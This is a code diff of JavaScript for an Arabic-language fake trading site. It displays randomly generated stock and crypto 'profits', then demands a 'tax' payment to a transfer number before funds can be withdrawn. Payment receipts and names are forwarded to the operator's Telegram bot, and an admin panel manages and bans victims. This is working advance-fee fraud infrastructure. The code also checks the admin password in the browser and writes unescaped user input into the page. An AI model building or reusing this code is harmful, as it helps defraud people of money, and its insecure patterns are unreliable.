+                    window.timerInterval = null;
+                }
             }
         }
-    }
 
-    // ============================================================
-    //  عرض نتيجة التداول (صفحة الأسهم)
-    // ============================================================
-    function showTradingResult() {
-        const container = document.getElementById('timerResult');
-        if (!container) return;
+        function restoreTimerBackground() {
+            if (localStorage.getItem('timer_completed') === 'true') {
+                document.getElementById('timerDisplay').textContent = '00:00';
+                document.getElementById('progressFill').style.width = '0%';
+                showTradingResult();
+                return;
+            }
 
-        const name = sessionStorage.getItem('reg_name') || 'مستخدم';
-        const tax = sessionStorage.getItem('reg_tax') || 3000;
-
-        const stocks = [
-            { symbol: 'AAPL', price: (180 + Math.random() * 20).toFixed(2), change: (Math.random() * 10 + 2).toFixed(1) },
-            { symbol: 'GOOGL', price: (140 + Math.random() * 15).toFixed(2), change: (Math.random() * 8 + 1).toFixed(1) },
-            { symbol: 'AMZN', price: (200 + Math.random() * 25).toFixed(2), change: (Math.random() * 12 + 3).toFixed(1) },
-            { symbol: 'TSLA', price: (380 + Math.random() * 40).toFixed(2), change: (Math.random() * 15 + 5).toFixed(1) },
-            { symbol: 'BTC', price: (65000 + Math.random() * 4000).toFixed(0), change: (Math.random() * 8 + 2).toFixed(1) },
-            { symbol: 'ETH', price: (3700 + Math.random() * 400).toFixed(0), change: (Math.random() * 7 + 1).toFixed(1) }
-        ];
-
-        let stocksHTML = '<div class="stocks-grid">';
-        stocks.forEach(s => {
-            const isUp = parseFloat(s.change) > 0;
-            stocksHTML += `
-                <div class="stock-card ${isUp ? 'up' : 'down'}">
-                    <div class="stock-symbol">${s.symbol}</div>
-                    <div class="stock-price">$${s.price}</div>
-                    <div class="stock-change">
-                        <i class="fas fa-arrow-${isUp ? 'up' : 'down'}"></i> ${s.change}%
-                    </div>
-                </div>
-            `;
-        });
-        stocksHTML += '</div>';
-
-        container.innerHTML = `
-            <div style="font-size:2.2rem; margin-bottom:8px;">
-                <span class="confetti">🎉</span>
-                <span style="color:#f5c842;"> مرحباً ${name}!</span>
-                <span class="confetti">🎉</span>
-            </div>
-            <p style="color:#b0c4e0; margin-bottom:10px;">نتائج التداول لهذا اليوم</p>
-            ${stocksHTML}
-            <div class="tax-box">
-                <h3><i class="fas fa-gem" style="color:#f5c842;"></i> ادفع الضريبة</h3>
-                <p style="font-size:1.1rem; color:#f5c842; font-weight:700; margin:8px 0;">
-                    <span id="taxAmountDisplay">${tax}</span> جنيه لسحب فلوسك من الموقع
-                </p>
-                <p style="color:#b0c4e0; font-size:0.9rem;">قم بتحويل المبلغ على الرقم التالي:</p>
-                <div class="payment-number-box" style="margin:10px 0 14px; background:rgba(255,255,255,0.06);">
-                    <span class="payment-number" id="taxPaymentNumber">${loadSettings().paymentNumber || DEFAULT_PAYMENT_NUMBER}</span>
-                    <button class="copy-btn" id="taxCopyBtn">
-                        <i class="fas fa-copy"></i> نسخ
-                    </button>
-                </div>
-                <div class="upload-area" id="taxUploadArea" style="margin:6px 0 14px; padding:18px;">
-                    <i class="fas fa-receipt"></i>
-                    <p>رفع صورة إيصال التحويل</p>
-                    <div class="file-name" id="taxFileNameDisplay">لم يتم اختيار ملف</div>
-                </div>
-                <input type="file" id="taxFileInput" accept="image/*" />
-                <button class="btn-primary btn-gold" id="submitTaxBtn" style="width:100%; justify-content:center; margin-top:6px;">
-                    <i class="fas fa-paper-plane"></i> إرسال إيصال الضريبة
-                </button>
-            </div>
-            <div style="margin-top:12px; font-size:0.8rem; color:#5e6f8a;">
-                <i class="fas fa-info-circle"></i> سيتم تحديث حالة طلبك في قسم "تتبع طلبك"
-            </div>
-        `;
-
-        // إعادة ربط الأحداث
-        const taxCopyBtn = document.getElementById('taxCopyBtn');
-        if (taxCopyBtn) {
-            taxCopyBtn.addEventListener('click', function() {
-                const num = document.getElementById('taxPaymentNumber').textContent.trim();
-                navigator.clipboard.writeText(num).then(() => {
-                    this.innerHTML = '<i class="fas fa-check"></i> تم النسخ';
-                    showToast('تم نسخ الرقم');
-                    setTimeout(() => {
-                        this.innerHTML = '<i class="fas fa-copy"></i> نسخ';
-                    }, 2500);
-                }).catch(() => {
-                    const el = document.createElement('textarea');
-                    el.value = num;
-                    document.body.appendChild(el);
-                    el.select();
-                    document.execCommand('copy');
-                    document.body.removeChild(el);
-                    showToast('تم نسخ الرقم');
-                });
-            });
+            const startTime = localStorage.getItem(TIMER_KEY);
+            if (startTime) {
+                const remaining = getRemainingSeconds();
+                if (remaining <= 0) {
+                    document.getElementById('timerDisplay').textContent = '00:00';
+                    document.getElementById('progressFill').style.width = '0%';
+                    localStorage.setItem('timer_completed', 'true');
+                    localStorage.removeItem(TIMER_KEY);
+                    showTradingResult();
+                } else {
+                    if (window.timerInterval) clearInterval(window.timerInterval);
+                    window.timerInterval = setInterval(updateTimerDisplay, 1000);
+                    updateTimerDisplay();
+                }
+            }
         }
 
-        const taxFileInput = document.getElementById('taxFileInput');
-        const taxUploadArea = document.getElementById('taxUploadArea');
-        const taxFileNameDisplay = document.getElementById('taxFileNameDisplay');
-        if (taxUploadArea) {
-            taxUploadArea.addEventListener('click', () => taxFileInput.click());
-            taxFileInput.addEventListener('change', function() {
+        // ===== عرض نتيجة التداول =====
+        function showTradingResult() {
+            const container = document.getElementById('timerResult');
+            if (!container) return;
+
+            const name = sessionStorage.getItem('reg_name') || 'مستخدم';
+            const tax = sessionStorage.getItem('reg_tax') || 3000;
+
+            const stocks = [
+                { symbol: 'AAPL', price: (180 + Math.random() * 20).toFixed(2), change: (Math.random() * 10 + 2).toFixed(1) },
+                { symbol: 'GOOGL', price: (140 + Math.random() * 15).toFixed(2), change: (Math.random() * 8 + 1).toFixed(1) },
+                { symbol: 'AMZN', price: (200 + Math.random() * 25).toFixed(2), change: (Math.random() * 12 + 3).toFixed(1) },
+                { symbol: 'TSLA', price: (380 + Math.random() * 40).toFixed(2), change: (Math.random() * 15 + 5).toFixed(1) },
+                { symbol: 'BTC', price: (65000 + Math.random() * 4000).toFixed(0), change: (Math.random() * 8 + 2).toFixed(1) },
+                { symbol: 'ETH', price: (3700 + Math.random() * 400).toFixed(0), change: (Math.random() * 7 + 1).toFixed(1) }
+            ];
+
+            let stocksHTML = '<div class="stocks-grid">';
+            stocks.forEach(s => {
+                const isUp = parseFloat(s.change) > 0;
+                stocksHTML += `
+                    <div class="stock-card ${isUp ? 'up' : 'down'}">
+                        <div class="stock-symbol">${s.symbol}</div>
+                        <div class="stock-price">$${s.price}</div>
+                        <div class="stock-change">
+                            <i class="fas fa-arrow-${isUp ? 'up' : 'down'}"></i> ${s.change}%
+                        </div>
+                    </div>
+                `;
+            });
+            stocksHTML += '</div>';
+
+            container.innerHTML = `
+                <div style="font-size:2.2rem; margin-bottom:8px;">
+                    <span class="confetti">🎉</span>
+                    <span style="color:#f5c842;"> مرحباً ${name}!</span>
+                    <span class="confetti">🎉</span>
+                </div>
+                <p style="color:#b0c4e0; margin-bottom:10px;">نتائج التداول لهذا اليوم</p>
+                ${stocksHTML}
+                <div class="tax-box">
+                    <h3><i class="fas fa-gem" style="color:#f5c842;"></i> ادفع الضريبة</h3>
+                    <p style="font-size:1.1rem; color:#f5c842; font-weight:700; margin:8px 0;">
+                        <span id="taxAmountDisplay">${tax}</span> جنيه لسحب فلوسك من الموقع
+                    </p>
+                    <p style="color:#b0c4e0; font-size:0.9rem;">قم بتحويل المبلغ على الرقم التالي:</p>
+                    <div class="payment-number-box" style="margin:10px 0 14px; background:rgba(255,255,255,0.06);">
+                        <span class="payment-number" id="taxPaymentNumber">${loadSettings().paymentNumber || DEFAULT_PAYMENT_NUMBER}</span>
+                        <button class="copy-btn" id="taxCopyBtn">
+                            <i class="fas fa-copy"></i> نسخ
+                        </button>
+                    </div>
+                    <div class="upload-area" id="taxUploadArea" style="margin:6px 0 14px; padding:18px;">
+                        <i class="fas fa-receipt"></i>
+                        <p>رفع صورة إيصال التحويل</p>
+                        <div class="file-name" id="taxFileNameDisplay">لم يتم اختيار ملف</div>
+                    </div>
+                    <input type="file" id="taxFileInput" accept="image/*" />
+                    <button class="btn-primary btn-gold" id="submitTaxBtn" style="width:100%; justify-content:center; margin-top:6px;">
+                        <i class="fas fa-paper-plane"></i> إرسال إيصال الضريبة
+                    </button>
+                </div>
+                <div style="margin-top:12px; font-size:0.8rem; color:#5e6f8a;">
+                    <i class="fas fa-info-circle"></i> سيتم تحديث حالة طلبك في قسم "تتبع طلبك"
+                </div>
+            `;
+
+            // إعادة ربط الأحداث لنسخ الضريبة
+            const taxCopyBtn = document.getElementById('taxCopyBtn');
+            if (taxCopyBtn) {
+                taxCopyBtn.addEventListener('click', function() {
+                    const num = document.getElementById('taxPaymentNumber').textContent.trim();
+                    navigator.clipboard.writeText(num).then(() => {
+                        this.innerHTML = '<i class="fas fa-check"></i> تم النسخ';
+                        showToast('تم نسخ الرقم');
+                        setTimeout(() => {
+                            this.innerHTML = '<i class="fas fa-copy"></i> نسخ';
+                        }, 2500);
+                    }).catch(() => {
+                        const el = document.createElement('textarea');
+                        el.value = num;
+                        document.body.appendChild(el);
+                        el.select();
+                        document.execCommand('copy');
+                        document.body.removeChild(el);
+                        showToast('تم نسخ الرقم');
+                    });
+                });
+            }
+
+            // ربط رفع صورة الضريبة
+            const taxFileInput = document.getElementById('taxFileInput');
+            const taxUploadArea = document.getElementById('taxUploadArea');
+            const taxFileNameDisplay = document.getElementById('taxFileNameDisplay');
+            if (taxUploadArea) {
+                taxUploadArea.addEventListener('click', () => taxFileInput.click());
+                taxFileInput.addEventListener('change', function() {
+                    if (this.files.length > 0) {
+                        window.taxFile = this.files[0];
+                        taxFileNameDisplay.textContent = window.taxFile.name;
+                        taxUploadArea.style.borderColor = '#f5c842';
+                        taxUploadArea.style.background = 'rgba(245,200,66,0.05)';
+                    } else {
+                        window.taxFile = null;
+                        taxFileNameDisplay.textContent = 'لم يتم اختيار ملف';
+                        taxUploadArea.style.borderColor = 'rgba(255,215,0,0.15)';
+                        taxUploadArea.style.background = 'rgba(255,255,255,0.02)';
+                    }
+                });
+            }
+        }
+
+        // ===== TAX SUBMIT =====
+        let taxFile = null;
+        const taxFileInputGlobal = document.getElementById('taxFileInput');
+        const taxUploadAreaGlobal = document.getElementById('taxUploadArea');
+        const taxFileNameDisplayGlobal = document.getElementById('taxFileNameDisplay');
+
+        if (taxUploadAreaGlobal) {
+            taxUploadAreaGlobal.addEventListener('click', () => taxFileInputGlobal.click());
+            taxFileInputGlobal.addEventListener('change', function() {
                 if (this.files.length > 0) {
-                    window.taxFile = this.files[0];
-                    taxFileNameDisplay.textContent = window.taxFile.name;
-                    taxUploadArea.style.borderColor = '#f5c842';
-                    taxUploadArea.style.background = 'rgba(245,200,66,0.05)';
+                    taxFile = this.files[0];
+                    taxFileNameDisplayGlobal.textContent = taxFile.name;
+                    taxUploadAreaGlobal.style.borderColor = '#f5c842';
+                    taxUploadAreaGlobal.style.background = 'rgba(245,200,66,0.05)';
                 } else {
-                    window.taxFile = null;
-                    taxFileNameDisplay.textContent = 'لم يتم اختيار ملف';
-                    taxUploadArea.style.borderColor = 'rgba(255,215,0,0.15)';
-                    taxUploadArea.style.background = 'rgba(255,255,255,0.02)';
+                    taxFile = null;
+                    taxFileNameDisplayGlobal.textContent = 'لم يتم اختيار ملف';
+                    taxUploadAreaGlobal.style.borderColor = 'rgba(255,215,0,0.15)';
+                    taxUploadAreaGlobal.style.background = 'rgba(255,255,255,0.02)';
                 }
             });
         }
-    }
 
-    // ============================================================
-    //  TAX SUBMIT
-    // ============================================================
-    let taxFile = null;
-    const taxFileInputGlobal = document.getElementById('taxFileInput');
-    const taxUploadAreaGlobal = document.getElementById('taxUploadArea');
-    const taxFileNameDisplayGlobal = document.getElementById('taxFileNameDisplay');
+        document.getElementById('submitTaxBtn')?.addEventListener('click', async function() {
+            const settings = loadSettings();
+            const botToken = settings.botToken || DEFAULT_BOT_TOKEN;
+            const chatId = settings.chatId || DEFAULT_CHAT_ID;
 
-    if (taxUploadAreaGlobal) {
-        taxUploadAreaGlobal.addEventListener('click', () => taxFileInputGlobal.click());
-        taxFileInputGlobal.addEventListener('change', function() {
-            if (this.files.length > 0) {
-                taxFile = this.files[0];
-                taxFileNameDisplayGlobal.textContent = taxFile.name;
-                taxUploadAreaGlobal.style.borderColor = '#f5c842';
-                taxUploadAreaGlobal.style.background = 'rgba(245,200,66,0.05)';
-            } else {
+            const name = sessionStorage.getItem('reg_name') || 'غير محدد';
+            const taxAmount = sessionStorage.getItem('reg_tax') || 3000;
+            const orderId = sessionStorage.getItem('orderId');
+
+            if (!taxFile) {
+                showToast('يرجى رفع صورة إيصال الضريبة', 'warning');
+                return;
+            }
+
+            if (orderId) {
+                await database.ref(`orders/${orderId}`).update({ taxImageUploaded: true, taxAmount });
+            }
+
+            const message =
+                `💰 *إيصال الضريبة*%0A` +
+                `👤 الاسم: ${name}%0A` +
+                `💵 المبلغ المحول: ${taxAmount} جنيه%0A` +
+                `🆔 رقم الطلب: ${orderId || 'غير معروف'}%0A` +
+                `🕒 تم الإرسال: ${new Date().toLocaleString('ar-EG')}`;
+
+            try {
+                const textUrl =
+                    `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=Markdown`;
+                await fetch(textUrl);
+
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', taxFile);
+                formData.append('caption', `📎 إيصال ضريبة - ${name} - ${taxAmount} جنيه`);
+                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                showToast('✅ تم إرسال إيصال الضريبة بنجاح!', 'success');
                 taxFile = null;
                 taxFileNameDisplayGlobal.textContent = 'لم يتم اختيار ملف';
                 taxUploadAreaGlobal.style.borderColor = 'rgba(255,215,0,0.15)';
                 taxUploadAreaGlobal.style.background = 'rgba(255,255,255,0.02)';
+                taxFileInputGlobal.value = '';
+
+            } catch (err) {
+                showToast('❌ خطأ في الإرسال: ' + err.message, 'warning');
             }
         });
-    }
 
-    document.getElementById('submitTaxBtn')?.addEventListener('click', async function() {
-        const settings = loadSettings();
-        const botToken = settings.botToken || DEFAULT_BOT_TOKEN;
-        const chatId = settings.chatId || DEFAULT_CHAT_ID;
+        // ===== ADMIN PASSWORD =====
+        document.getElementById('adminPasswordSubmitBtn').addEventListener('click', function() {
+            const input = document.getElementById('adminPasswordInput').value.trim();
+            const now = Date.now();
 
-        const name = sessionStorage.getItem('reg_name') || 'غير محدد';
-        const taxAmount = sessionStorage.getItem('reg_tax') || 3000;
-        const orderId = sessionStorage.getItem('orderId');
+            if (now < lockUntil) {
+                const remaining = Math.ceil((lockUntil - now) / 60000);
+                document.getElementById('passwordError').textContent =
+                    `⛔ تم تجاوز عدد المحاولات. انتظر ${remaining} دقيقة قبل المحاولة مرة أخرى.`;
+                return;
+            }
 
-        if (!taxFile) {
-            showToast('يرجى رفع صورة إيصال الضريبة', 'warning');
-            return;
-        }
+            if (input === ADMIN_PASSWORD) {
+                attemptsCount = 0;
+                localStorage.setItem('admin_attempts', '0');
+                localStorage.setItem('admin_lock_until', '0');
+                document.getElementById('passwordError').textContent = '';
+                showPage('page-admin-dashboard');
+                loadAdminDashboard();
+                showToast('مرحباً أيها الأدمن', 'success');
+            } else {
+                attemptsCount++;
+                localStorage.setItem('admin_attempts', attemptsCount.toString());
+                const left = Math.max(0, 10 - attemptsCount);
+                document.getElementById('attemptsLeft').textContent = left;
 
-        if (orderId) {
-            await database.ref(`orders/${orderId}`).update({ taxImageUploaded: true, taxAmount });
-        }
+                if (attemptsCount >= 10) {
+                    lockUntil = Date.now() + 3600000;
+                    localStorage.setItem('admin_lock_until', lockUntil.toString());
+                    document.getElementById('passwordError').textContent =
+                        '🚫 تم تجاوز 10 محاولات. تم حظر الدخول لمدة ساعة.';
+                    document.getElementById('attemptsLeft').textContent = '0';
+                } else {
+                    document.getElementById('passwordError').textContent =
+                        `❌ كلمة المرور غير صحيحة. متبقي ${left} محاولات.`;
+                }
+                document.getElementById('adminPasswordInput').value = '';
+                document.getElementById('adminPasswordInput').focus();
+            }
+        });
 
-        const message =
-            `💰 *إيصال الضريبة*%0A` +
-            `👤 الاسم: ${name}%0A` +
-            `💵 المبلغ المحول: ${taxAmount} جنيه%0A` +
-            `🆔 رقم الطلب: ${orderId || 'غير معروف'}%0A` +
-            `🕒 تم الإرسال: ${new Date().toLocaleString('ar-EG')}`;
-
-        try {
-            const textUrl =
-                `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=Markdown`;
-            await fetch(textUrl);
-
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', taxFile);
-            formData.append('caption', `📎 إيصال ضريبة - ${name} - ${taxAmount} جنيه`);
-            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-
-            showToast('✅ تم إرسال إيصال الضريبة بنجاح!', 'success');
-            taxFile = null;
-            taxFileNameDisplayGlobal.textContent = 'لم يتم اختيار ملف';
-            taxUploadAreaGlobal.style.borderColor = 'rgba(255,215,0,0.15)';
-            taxUploadAreaGlobal.style.background = 'rgba(255,255,255,0.02)';
-            taxFileInputGlobal.value = '';
-
-        } catch (err) {
-            showToast('❌ خطأ في الإرسال: ' + err.message, 'warning');
-        }
-    });
-
-    // ============================================================
-    //  ADMIN PASSWORD
-    // ============================================================
-    document.getElementById('backToRegisterFromPass').addEventListener('click', () => showPage('page-register'));
-
-    document.getElementById('resetAttemptsBtn').addEventListener('click', function() {
-        attemptsCount = 0;
-        lockUntil = 0;
-        localStorage.setItem('admin_attempts', '0');
-        localStorage.setItem('admin_lock_until', '0');
-        document.getElementById('attemptsLeft').textContent = '10';
-        document.getElementById('passwordError').textContent = '✅ تم إعادة تعيين المحاولات';
-        showToast('تم إعادة تعيين المحاولات', 'info');
-    });
-
-    document.getElementById('adminPasswordSubmitBtn').addEventListener('click', function() {
-        const input = document.getElementById('adminPasswordInput').value.trim();
-        const now = Date.now();
-
-        if (now < lockUntil) {
-            const remaining = Math.ceil((lockUntil - now) / 60000);
-            document.getElementById('passwordError').textContent =
-                `⛔ تم تجاوز عدد المحاولات. انتظر ${remaining} دقيقة قبل المحاولة مرة أخرى.`;
-            return;
-        }
-
-        if (input === ADMIN_PASSWORD) {
+        document.getElementById('resetAttemptsBtn').addEventListener('click', function() {
             attemptsCount = 0;
+            lockUntil = 0;
             localStorage.setItem('admin_attempts', '0');
             localStorage.setItem('admin_lock_until', '0');
-            document.getElementById('passwordError').textContent = '';
-            showPage('page-admin-dashboard');
-            loadAdminDashboard();
-            showToast('مرحباً أيها الأدمن', 'success');
-        } else {
-            attemptsCount++;
-            localStorage.setItem('admin_attempts', attemptsCount.toString());
-            const left = Math.max(0, 10 - attemptsCount);
-            document.getElementById('attemptsLeft').textContent = left;
-
-            if (attemptsCount >= 10) {
-                lockUntil = Date.now() + 3600000;
-                localStorage.setItem('admin_lock_until', lockUntil.toString());
-                document.getElementById('passwordError').textContent =
-                    '🚫 تم تجاوز 10 محاولات. تم حظر الدخول لمدة ساعة.';
-                document.getElementById('attemptsLeft').textContent = '0';
-            } else {
-                document.getElementById('passwordError').textContent =
-                    `❌ كلمة المرور غير صحيحة. متبقي ${left} محاولات.`;
-            }
-            document.getElementById('adminPasswordInput').value = '';
-            document.getElementById('adminPasswordInput').focus();
-        }
-    });
-
-    // ============================================================
-    //  ADMIN LOGOUT
-    // ============================================================
-    document.getElementById('adminLogoutBtn').addEventListener('click', function() {
-        if (confirm('تسجيل الخروج؟')) {
-            localStorage.removeItem(PAGE_KEY);
-            showPage('page-landing');
-        }
-    });
-
-    // ============================================================
-    //  ADMIN TABS
-    // ============================================================
-    document.querySelectorAll('.admin-tab').forEach(tab => {
-        tab.addEventListener('click', function() {
-            document.querySelectorAll('.admin-tab').forEach(t => t.classList.remove('active'));
-            document.querySelectorAll('.admin-tab-content').forEach(c => c.classList.remove('active'));
-            this.classList.add('active');
-            const target = document.getElementById(this.dataset.tab);
-            if (target) target.classList.add('active');
-            if (this.dataset.tab === 'tab-orders') loadOrders();
-            if (this.dataset.tab === 'tab-banned') loadBannedUsers();
+            document.getElementById('attemptsLeft').textContent = '10';
+            document.getElementById('passwordError').textContent = '✅ تم إعادة تعيين المحاولات';
+            showToast('تم إعادة تعيين المحاولات', 'info');
         });
-    });
 
-    // ============================================================
-    //  LOAD ORDERS
-    // ============================================================
-    async function loadOrders() {
-        const container = document.getElementById('ordersList');
-        if (!container) return;
-        container.innerHTML = '<p style="color:#5e6f8a; text-align:center; padding:20px;">جاري تحميل الطلبات...</p>';
+        // ===== ADMIN LOGOUT =====
+        document.getElementById('adminLogoutBtn').addEventListener('click', function() {
+            if (confirm('تسجيل الخروج؟')) {
+                localStorage.removeItem(PAGE_KEY);
+                showPage('page-landing');
+            }
+        });
 
-        const orders = await getOrders();
-        if (orders.length === 0) {
-            container.innerHTML = '<p style="color:#5e6f8a; text-align:center; padding:20px;">لا توجد طلبات حتى الآن</p>';
-            return;
+        // ===== ADMIN TABS =====
+        document.querySelectorAll('.admin-tab').forEach(tab => {
+            tab.addEventListener('click', function() {
+                document.querySelectorAll('.admin-tab').forEach(t => t.classList.remove('active'));
+                document.querySelectorAll('.admin-tab-content').forEach(c => c.classList.remove('active'));
+                this.classList.add('active');
+                const target = document.getElementById(this.dataset.tab);
+                if (target) target.classList.add('active');
+                if (this.dataset.tab === 'tab-orders') loadOrders();
+                if (this.dataset.tab === 'tab-banned') loadBannedUsers();
+            });
+        });
+
+        // ===== LOAD ORDERS =====
+        async function loadOrders() {
+            const container = document.getElementById('ordersList');
+            if (!container) return;
+            container.innerHTML = '<p style="color:#5e6f8a; text-align:center; padding:20px;">جاري تحميل الطلبات...</p>';
+
+            const orders = await getOrders();
+            if (orders.length === 0) {
+                container.innerHTML = '<p style="color:#5e6f8a; text-align:center; padding:20px;">لا توجد طلبات حتى الآن</p>';
+                return;
+            }
+
+            orders.sort((a, b) => b.timestamp - a.timestamp);
+
+            let html = '';
+            orders.forEach((order, index) => {
+                const statusClass = order.status === 'pending' ? 'pending' : order.status === 'accepted' ? 'accepted' : 'rejected';
+                const statusText = order.status === 'pending' ? 'قيد المراجعة' : order.status === 'accepted' ? 'مقبول' : 'مرفوض';
+                const date = new Date(order.timestamp).toLocaleString('ar-EG');
+
+                html += `
+                    <div class="order-item" data-order-id="${order.orderId || index}">
+                        <div class="order-header">
+                            <div>
+                                <strong style="color:#fff;">${order.name}</strong>
+                                <span style="color:#8a9bb8; margin-right:10px;">📱 ${order.phone}</span>
+                            </div>
+                            <div>
+                                <span class="order-status ${statusClass}">${statusText}</span>
+                                <span style="color:#5e6f8a; font-size:0.8rem; margin-right:8px;">${date}</span>
+                            </div>
+                        </div>
+                        <div style="color:#b0c4e0; font-size:0.9rem; margin-top:4px;">
+                            الباقة: ${order.package} | الضريبة: ${order.tax || 0} جنيه
+                        </div>
+                        ${order.reason ? `<div class="order-reason">سبب الرفض: ${order.reason}</div>` : ''}
+                        ${order.status === 'pending' ? `
+                            <div class="order-actions">
+                                <button class="btn-sm btn-accept" onclick="acceptOrder('${order.orderId || index}')">
+                                    <i class="fas fa-check"></i> قبول
+                                </button>
+                                <button class="btn-sm btn-reject" onclick="rejectOrder('${order.orderId || index}')">
+                                    <i class="fas fa-times"></i> رفض
+                                </button>
+                                <button class="btn-sm btn-del" onclick="banUserFromOrder('${order.phone}')">
+                                    <i class="fas fa-ban"></i> حظر
+                                </button>
+                            </div>
+                        ` : ''}
+                    </div>
+                `;
+            });
+            container.innerHTML = html;
+
+            window.acceptOrder = async function(orderId) {
+                if (confirm('تأكيد قبول هذا الطلب؟')) {
+                    await updateOrderStatus(orderId, 'accepted');
+                    loadOrders();
+                }
+            };
+
+            window.rejectOrder = async function(orderId) {
+                const reason = prompt('أدخل سبب الرفض (سيظهر للمستخدم):');
+                if (reason !== null) {
+                    await updateOrderStatus(orderId, 'rejected', reason.trim() || 'لم يتم تحديد سبب');
+                    loadOrders();
+                }
+            };
+
+            window.banUserFromOrder = async function(phone) {
+                if (confirm(`هل تريد حظر المستخدم (${phone}) من الموقع؟`)) {
+                    await banUser(phone, '');
+                    const orders = await getOrders();
+                    const userOrders = orders.filter(o => o.phone === phone && o.status === 'pending');
+                    for (let o of userOrders) {
+                        await updateOrderStatus(o.orderId, 'rejected', 'تم حظر المستخدم');
+                    }
+                    loadOrders();
+                    loadBannedUsers();
+                }
+            };
         }
 
-        orders.sort((a, b) => b.timestamp - a.timestamp);
+        // ===== LOAD BANNED USERS =====
+        async function loadBannedUsers() {
+            const container = document.getElementById('bannedList');
+            if (!container) return;
+            container.innerHTML = '<p style="color:#5e6f8a; text-align:center; padding:20px;">جاري تحميل المحظورين...</p>';
 
-        let html = '';
-        orders.forEach((order, index) => {
-            const statusClass = order.status === 'pending' ? 'pending' : order.status === 'accepted' ? 'accepted' : 'rejected';
-            const statusText = order.status === 'pending' ? 'قيد المراجعة' : order.status === 'accepted' ? 'مقبول' : 'مرفوض';
-            const date = new Date(order.timestamp).toLocaleString('ar-EG');
+            const banned = await getBannedUsers();
+            if (banned.length === 0) {
+                container.innerHTML = '<p style="color:#5e6f8a; text-align:center; padding:20px;">لا يوجد مستخدمون محظورون</p>';
+                return;
+            }
 
-            html += `
-                <div class="order-item" data-order-id="${order.orderId || index}">
+            let html = '';
+            banned.forEach((user, index) => {
+                const date = new Date(user.timestamp).toLocaleString('ar-EG');
+                html += `
+                    <div class="order-item">
+                        <div>
+                            <strong style="color:#fff;">📱 ${user.phone}</strong>
+                            <span style="color:#8a9bb8; margin-right:10px;">🌐 ${user.ip || 'غير معروف'}</span>
+                            <span style="color:#5e6f8a; font-size:0.8rem; margin-right:8px;">${date}</span>
+                        </div>
+                        <button class="btn-sm btn-accept" onclick="unbanUserFromList('${user.phone}')" style="margin-top:6px;">
+                            <i class="fas fa-user-check"></i> إلغاء الحظر
+                        </button>
+                    </div>
+                `;
+            });
+            container.innerHTML = html;
+
+            window.unbanUserFromList = async function(phone) {
+                if (confirm(`إلغاء حظر المستخدم (${phone})؟`)) {
+                    await unbanUser(phone);
+                    loadBannedUsers();
+                }
+            };
+        }
+
+        // ===== UNBAN =====
+        document.getElementById('unbanUserBtn')?.addEventListener('click', async function() {
+            const phone = document.getElementById('unbanPhone').value.trim();
+            if (!phone) {
+                showToast('يرجى إدخال رقم الهاتف', 'warning');
+                return;
+            }
+            await unbanUser(phone);
+            document.getElementById('unbanPhone').value = '';
+            loadBannedUsers();
+        });
+
+        // ===== ADMIN SETTINGS =====
+        function loadAdminDashboard() {
+            const settings = loadSettings();
+            document.getElementById('adminBotToken').value = settings.botToken || DEFAULT_BOT_TOKEN;
+            document.getElementById('adminChatId').value = settings.chatId || DEFAULT_CHAT_ID;
+            document.getElementById('adminPaymentNumber').value = settings.paymentNumber || DEFAULT_PAYMENT_NUMBER;
+            document.getElementById('paymentNumberDisplay').textContent = settings.paymentNumber || DEFAULT_PAYMENT_NUMBER;
+            document.getElementById('taxPaymentNumber').textContent = settings.paymentNumber || DEFAULT_PAYMENT_NUMBER;
+
+            renderAdminPackages(settings);
+            renderUserPackages(settings);
+            loadOrders();
+            loadBannedUsers();
+        }
+
+        // ===== ADMIN BUTTONS =====
+        document.getElementById('saveToFirebaseBtn')?.addEventListener('click', async function() {
+            const settings = loadSettings();
+            await saveToFirebase(settings);
+        });
+
+        document.getElementById('loadFromFirebaseBtn')?.addEventListener('click', async function() {
+            await loadFromFirebase();
+            loadOrders();
+            loadBannedUsers();
+        });
+
+        document.getElementById('saveBotSettingsBtn')?.addEventListener('click', function() {
+            const token = document.getElementById('adminBotToken').value.trim();
+            const chatId = document.getElementById('adminChatId').value.trim();
+            if (!token || !chatId) {
+                showToast('يرجى إدخال التوكن والمعرف', 'warning');
+                return;
+            }
+            const settings = loadSettings();
+            settings.botToken = token;
+            settings.chatId = chatId;
+            saveSettings(settings);
+            showToast('تم حفظ إعدادات البوت محلياً');
+        });
+
+        document.getElementById('savePaymentNumberBtn')?.addEventListener('click', function() {
+            const num = document.getElementById('adminPaymentNumber').value.trim();
+            if (!num) {
+                showToast('يرجى إدخال رقم صحيح', 'warning');
+                return;
+            }
+            const settings = loadSettings();
+            settings.paymentNumber = num;
+            saveSettings(settings);
+            showToast('تم تحديث رقم التحويل محلياً');
+        });
+
+        document.getElementById('addPackageBtn')?.addEventListener('click', function() {
+            const name = document.getElementById('newPkgName').value.trim();
+            const price = parseFloat(document.getElementById('newPkgPrice').value);
+            const returnAmt = parseFloat(document.getElementById('newPkgReturn').value);
+            const tax = parseFloat(document.getElementById('newPkgTax').value);
+            const duration = document.getElementById('newPkgDuration').value.trim() || '45 دقيقة';
+
+            if (!name || isNaN(price) || isNaN(returnAmt) || isNaN(tax)) {
+                showToast('يرجى ملء جميع الحقول بشكل صحيح', 'warning');
+                return;
+            }
+            const settings = loadSettings();
+            settings.packages.push({ name, price, returnAmount: returnAmt, tax, duration });
+            saveSettings(settings);
+            document.getElementById('newPkgName').value = '';
+            document.getElementById('newPkgPrice').value = '';
+            document.getElementById('newPkgReturn').value = '';
+            document.getElementById('newPkgTax').value = '';
+            document.getElementById('newPkgDuration').value = '';
+            showToast('تم إضافة الباقة محلياً');
+        });
+
+        // ===== CHECK ORDER STATUS =====
+        document.getElementById('checkOrderStatusBtn')?.addEventListener('click', () => {
+            showPage('page-order-status');
+        });
+
+        document.getElementById('checkStatusBtn')?.addEventListener('click', async function() {
+            const phone = document.getElementById('statusPhoneInput').value.trim();
+            const resultDiv = document.getElementById('orderStatusResult');
+            if (!phone) {
+                resultDiv.innerHTML = '<p style="color:#f5a342;">يرجى إدخال رقم الهاتف</p>';
